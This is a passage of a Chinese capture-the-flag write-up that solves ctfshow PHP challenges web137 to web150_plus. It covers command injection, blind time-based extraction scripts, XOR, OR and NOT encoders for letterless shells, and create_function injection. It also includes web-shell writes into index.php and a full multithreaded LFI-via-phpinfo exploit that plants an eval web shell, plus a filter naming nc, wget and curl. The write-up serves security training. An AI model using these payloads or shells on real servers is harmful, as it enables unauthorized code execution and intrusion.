    highlight_file(__FILE__);
}
?>
```

Linux中可以使用tee命令写文件。

```
ls /|tee file
```

访问file,可以下载返回flag文件名`f149_15_h3r3`

```
nl /f149_15_h3r3 | tee file
```



## web137

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

call_user_func($_POST['ctfshow']);
```

双冒号可以不用实例化一个类的情况下调用类的静态方法。

```
ctfshow=ctfshow:getFlag
```



## web138

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

搜了下PHP官方文档

![](http://img.npfs06.top/20210227174801.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

所以可以使用数组来绕过：

```
ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```



## web139

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```



> cut命令

![](http://img.npfs06.top/20210227182728.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

> awk命令

![](http://img.npfs06.top/20210227183251.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



NR(Number of Record)：行号，当前处理的文本行的行号

FNR : 各文件分别计数的行号

![](http://img.npfs06.top/20210227200720.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



```python
import requests
import time
import string
str=string.ascii_letters+string.digits
result=""
for i in range(1,5):
	key=0
	for j in range(1,15):
		if key==1:
			break
		for n in str:
			payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
			#print(payload)
			url="http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="+payload
			try:
				requests.get(url,timeout=(2.5,2.5))
			except:
			    result=result+n
			    print(result)
			    break
			if n=='9':
				key=1
	result+=" "

```



```python
import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
	print(j)
	if key==1:
		break
	for n in str:
		payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
		#print(payload)
		url="http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="+payload
		try:
			requests.get(url,timeout=(2.5,2.5))
		except:
		    result=result+n
		    print(result)
		    break

```

最后 设置了 time.sleep(1)都出不来完整flag ~~放弃~~



## web140

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

通过表格松散比较可以看到0和字符串比较结果为真

![](https://img.npfs06.top/20210228194700.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

所以对于` if(intval($code) == 'ctfshow'){`我们只要让`intval($code)`为0，那么if语句为真，

intval会将非数字字符转换为0，也就是说 `intval('a')==0 intval('.')==0 intval('/')==0`

payload有很多

```
md5(phpinfo())
md5(sleep())
md5(md5())
current(localeconv)
sha1(getcwd())   
......
```



## web141

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

```

先来看下正则表达式
`/^\W+$/` 作用是匹配非数字字母下划线的字符
构造命令还是很简单的,这里用到取反，无字母shell的方法很多，不局限于取反

```php
<?php
//在命令行中运行
/*author yu22x*/
fwrite(STDOUT,'[+]your function: ');
$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
fwrite(STDOUT,'[+]your command: ');
$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```



![](https://img.npfs06.top/20210306234649.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

接下来再来说说怎么绕过`eval("return $v1$v3$v2;");`

我们看下面这个小例子

>1system("ls");      error不会执行
> 1+system("ls");    Warning 会执行

![](https://img.npfs06.top/20210306234347.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

这是php中一个有意思的地方，数字是可以和命令进行一些运算的，例如 `1+phpinfo();`是可以执行phpinfo()命令的, 命令前加一些 + - * / 之类的都可以成功命令执行,。所以我们只要构造`1*system("cat flag.php")*1`即可读取flag （这里不用加号是因为会被解析成空格）

payload：

```
?v1=1&v2=1&v3=*(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)*
```



## web142

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}

```

0和任何数字相乘都为0

payload

```
?v1=0
```

## web143

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

过滤了取反、或，我们还可以用异或，脚本如下



```php
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)^urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

```python
# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("xor_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"^\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

php运行后生成一个txt文档，包含所有可见字符的异或构造结果。
接着运行python脚本即可。
运行结果

```shell
[+] your function：system
[+] your command：ls
("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");
```

## web144

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

function check($str){
    return strlen($str)===1?true:false;
}
```

没什么变化，主要就是v2,v3换了个位置，对v3加了个check过滤，要求长度为1

payload

```shell
?v1=1&v3=1&v2=*(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
```



## web145

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

可以用或运算

```php
<?php

/* author yu22x */

$myfile = fopen("or_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";
    }
  
		else{
		$a='%'.$hex_i;
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b));
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

```python
# author yu22x

import requests
import urllib
from sys import *
import os
def action(arg):
   s1=""
   s2=""
   for i in arg:
       f=open("or_rce.txt","r")
       while True:
           t=f.readline()
           if t=="":
               break
           if t[0]==i:
               #print(i)
               s1+=t[2:5]
               s2+=t[6:9]
               break
       f.close()
   output="(\""+s1+"\"|\""+s2+"\")"
   return(output)
   
while True:
   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
   print(param)
```

运行结果

```shell
[+] your function：system
[+] your command：ls
("%13%19%13%14%05%0d"|"%60%60%60%60%60%60")("%0c%13"|"%60%60");
```

payload:

```shell
//对双引号做了过滤，用单引号替换
//对加减乘除做了过滤，可以1用或替换 0|(xxx)|0  ，当然也可以用三元运算符 1?(xxxx):0

?v1=0&v2=0&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%03%01%14%00%06%0c%01%07%02%10%08%10'|'%60%60%60%20%60%60%60%60%2c%60%60%60')|
```



## web146

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

没有对`|`做过滤，payload同web145



## web147

```php
<?php
highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```



![](https://img.npfs06.top/20210307104106.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

很容易就fuzz到了就是`\`这个符号

后来稍微翻了翻别人的writeup，才知道原因，**在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。**



紧接着就到了如何只控制第二个参数来执行命令的问题了，后来找到可以用`create_function`来完成，`create_function`的第一个参数是参数，第二个参数是内容。

函数结构形似

```
create_function('$a,$b','return 111')

==>

function a($a, $b){
    return 111;
}
```

然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。

```
create_function('$a,$b','return 111;}phpinfo();//')

==>

function a($a, $b){
    return 111;}phpinfo();//
}
```

这样一来，我们想要执行的代码就会执行

paylaod:

```
get: show=echo 123;}system('cat flag.php');//
post: ctf=%5ccreate_function
```



## web148

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
}
```

![](https://img.npfs06.top/20210307110230.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

脚本同web143

## web149

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

遍历当前目录下所以文件，只保留`index.php`，其他文件都删除

可以利用条件竞争

```
ctf=1.php
show=<?php system('cat /ctfshow_fl0g_here.txt');?>
```

使用bp不断访问并传参，然后开一个去不断访问 1.php

非预期，直接往index.php里面写一句话
payload

```
ctf=index.php
show=<?php eval($_POST[1]);?>
```

## web150

```php
<?php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}

```

要另`$siVIP`为真，可以利用`extract($_GET);`进行变量覆盖

日志文件包含

原理可以看下我都这篇文章<a href="http://npfs06.top/2020/07/04/%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">日志文件包含</a>



![](https://img.npfs06.top/20210307171909.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



## web150_plus

~~虽然修复了非预期，但我还是用非预期做的...~~

```php
<?php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}

```

session文件包含

方法我就不多说了，参考我的另一篇文章<a href="http://npfs06.top/2020/10/10/%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" target="_blank">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a>照着做就好



预期解

1. 使用`?..CTFSHOW..=xxx`可以绕过正则匹配,利用`空格 [ . +`自动转换为`_`的特性

2. `__autoload()`
   这个函数并不属于CTFSHOW这个类的,全局都可以用
   在定义这个函数后,尝试使用不存在的类的时候会自动加载
   用法参考 <https://www.php.cn/php-weizijiaocheng-426838.html>
    当class_exists传入参数为当前未定义类的情况下 就会触发`__autoload`方法进行自动加载
   传入`?..CTFSHOW..=phpinfo`就会执行`phpinfo()`
   然后可以用LFI via PHPINFO
   可以参考:<https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md>

   修改一下exp再打

```python
#!/usr/bin/python
import sys
import threading
import socket

attempts_counter = 0


def setup(host, port, phpinfo_path, lfi_path, lfi_param, shell_code='<?php eval($_POST["mb"]);?>', shell_path='/tmp/g'):
    """
    根据提供参数返回请求内容
    :param host:HOST
    :param port:端口
    :param phpinfo_path: phpinfo文件地址
    :param lfi_path: 包含lfi的文件地址
    :param lfi_param: lfi载入文件时, 指定文件名的参数
    :param shell_code: shell代码
    :param shell_path: shell代码保存位置
    :return:
        phpinfo_request: phpinfo 请求内容
        lfi_request: lfi 请求内容
        tag: 标识内容
    """
    tag = 'Security Test'   # 搜索验证标识
    payload = \
'''{tag}\r
<?php $c=fopen('{shell_path}','w');fwrite($c,'{shell_code}');?>\r
'''.format(shell_code=shell_code, tag=tag, shell_path=shell_path)

    request_data = \
'''-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{payload}
-----------------------------7dbff1ded0714--\r
''' .format(payload=payload)

    phpinfo_request = \
'''POST {phpinfo_path}?%5f%5fCTFSHOW%5f%5f=phpinfo&a={padding} HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
HTTP_ACCEPT: {padding}\r
HTTP_USER_AGENT: {padding}\r
HTTP_ACCEPT_LANGUAGE: {padding}\r
HTTP_PRAGMA: {padding}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {request_data_length}\r
Host: {host}:{port}\r
\r
{request_data}
'''.format(
    padding='A' * 4000,
    phpinfo_path=phpinfo_path,
    request_data_length=len(request_data),
    host=host,
    port=port,
    request_data=request_data
    )

    lfi_request = \
'''POST {lfi_path}?{lfi_param} HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: {host}\r
Content-Type: application/x-www-form-urlencoded\r
\r
ctf={{}}\r
'''.format(
    lfi_path=lfi_path,
    lfi_param=lfi_param,
    host=host
    )
    return phpinfo_request, tag, lfi_request


def phpinfo_lfi(host, port, phpinfo_request, offset, lfi_request, tag):
    """
    通过向phpinfo发送大数据包延缓时间, 然后利用lfi执行
    :param host:HOST
    :param port:端口
    :param phpinfo_request: phpinfo页面请求内容
    :param offset: tmp_name在phpinfo中的偏移位
    :param lfi_request: lfi页面请求内容
    :param tag: 标识内容
    :return:
        tmp_file_name: 临时文件名
    """
    phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lfi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    phpinfo_socket.connect((host, port))
    lfi_socket.connect((host, port))

    # 1. 先向phpinfo发送大数据包, 且其中包含php会将payload放入临时文件中
    # print(phpinfo_request)
    # print(lfi_request)
    phpinfo_socket.send(phpinfo_request.encode())

    phpinfo_response_data = ''
    while len(phpinfo_response_data) < offset:
        # 取不到数据则反复执行
        phpinfo_response_data += phpinfo_socket.recv(offset).decode()

    try:
        tmp_name_index = phpinfo_response_data.index('[tmp_name] =&gt')
        # 获取包含payload的临时文件名
        tmp_file_name = phpinfo_response_data[
                            tmp_name_index + 17:
                            tmp_name_index + 31
                        ]
    except ValueError:
        return None
    # 2. 再向lfi发送包含payload的临时文件名, 用于包含
    lfi_socket.send((lfi_request.format(tmp_file_name)).encode())
    # print(lfi_request.format(tmp_file_name))
    lfi_response_data = lfi_socket.recv(4096).decode()

    # 3. 停止phpinfo socket连接
    phpinfo_socket.close()
    # 4. 停止lfi socket连接
    lfi_socket.close()
    if lfi_response_data.find(tag) != -1:
        # 5. lfi response中存在标识内容则payload执行成功
        return tmp_file_name


class ThreadWorker(threading.Thread):
    def __init__(self, event, lock, max_attempts,
                 host, port, phpinfo_request,
                 offset, lfi_request, tag,
                 shell_code, shell_path,
                 lfi_path, lfi_param):
        threading.Thread.__init__(self)
        self.event = event
        self.lock = lock
        self.max_attempts = max_attempts
        self.host = host
        self.port = port
        self.phpinfo_request = phpinfo_request
        self.offset = offset
        self.lfi_request = lfi_request
        self.tag = tag
        self.shell_code = shell_code
        self.shell_path = shell_path
        self.lfi_path = lfi_path
        self.lfi_param = lfi_param

    def run(self):
        global attempts_counter
        while not self.event.is_set():
            # 如果没有set event则一直重复执行, 直到已尝试次数大于最大尝试数(attempts_counter > max_attempts)
            with self.lock:
                # 获取锁, 执行完后释放
                if attempts_counter >= self.max_attempts:
                    return
                attempts_counter += 1
            try:
                tmp_file_name = phpinfo_lfi(
                    self.host, self.port, self.phpinfo_request, self.offset, self.lfi_request, self.tag)
                if self.event.is_set():
                    break
                if tmp_file_name:
                    # 找到tmp_file_name后通过set event停止运行
                    print('\n{shell_code} 已经被写入到{shell_path}中'.format(
                        shell_code=self.shell_code,
                        shell_path=self.shell_path
                    ))
                    'http://127.0.0.1/test/lfi_phpinfo/lfi.php?load=/tmp/gc&f=uname%20-a'
                    print('默认调用方法: http://{host}:{port}{lfi_path}?{lfi_param}={shell_path}&f=uname%20-a'.format(
                        host=self.host,
                        port=self.port,
                        lfi_path=self.lfi_path,
                        lfi_param=self.lfi_param,
                        shell_path=self.shell_path
                    ))

                    self.event.set()
            except socket.error:
                return


def get_offset(host, port, phpinfo_request):
    """
    获取tmp_name在phpinfo中的偏移量
    :param host: HOST
    :param port: 端口
    :param phpinfo_request: phpinfo 请求内容
    :return:
        tmp_name在phpinfo中的偏移量
    """

    phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    phpinfo_socket.connect((host, port))
    phpinfo_socket.send(phpinfo_request.encode())
    phpinfo_response_data = ''
    while True:
        i = phpinfo_socket.recv(4096).decode()
        phpinfo_response_data += i
        if i == '':
            break

        # 检测是否是最后一个数据块
        if i.endswith('0\r\n\r\n'):
            break
    phpinfo_socket.close()
    tmp_name_index = phpinfo_response_data.find('[tmp_name] =&gt')
    print(phpinfo_response_data)
    if tmp_name_index == -1:
        raise ValueError('没有在phpinfo中找到tmp_name')
    print('找到了 {} 在phpinfo内容索引为{}的位置'.format(
        phpinfo_response_data[tmp_name_index:tmp_name_index+10], tmp_name_index))

    return tmp_name_index + 256


def main():
    pool_size = 100
    host = '9627f67a-6cd4-4434-82d0-24853f6204c8.chall.ctf.show'
    port = 80
    phpinfo_path = '/'
    lfi_path = '/'
    lfi_param = 'isVIP=1'
    shell_code = '<?php eval($_POST["mb"]);?>'
    shell_path = '/tmp/g'
    # 最大尝试次数
    max_attempts = 1000

    print('LFI With PHPInfo()')
    # 一 生成phpinfo请求内容, 标志内容, lfi请求内容
    phpinfo_request, tag, lfi_request = setup(
        host=host, port=port, phpinfo_path=phpinfo_path, lfi_path=lfi_path,
        lfi_param=lfi_param, shell_code=shell_code, shell_path=shell_path)

    # 二 获取[tmp_name]在phpinfo中的偏移位
    offset = get_offset(host, port, phpinfo_request)

    sys.stdout.flush()
    thread_event = threading.Event()
    thread_lock = threading.Lock()
    print('创建线程池 {}...'.format(pool_size))
    sys.stdout.flush()
    thread_pool = []
    for i in range(0, pool_size):
        # 三 多线程执行phpinfo_lfi
        thread_pool.append(ThreadWorker(thread_event, thread_lock, max_attempts,
                                        host, port, phpinfo_request, offset,
                                        lfi_request, tag,
                                        shell_code, shell_path,
                                        lfi_path, lfi_param
                                        ))
    for t in thread_pool:
        t.start()
    try:
        while not thread_event.wait(1):
            if thread_event.is_set():
                break
            with thread_lock:
                sys.stdout.write('\r{} / {}'.format(attempts_counter, max_attempts))
                sys.stdout.flush()
                if attempts_counter >= max_attempts:
                    # 尝试次数大于最大尝试次数则退出
                    break
        if thread_event.is_set():
            print('''success !''')
        else:
            print('LJBD!')
    except KeyboardInterrupt:
        print('\n正在停止所有线程...')
        thread_event.set()
    for t in thread_pool:
        t.join()


if __name__ == "__main__":
    main()
```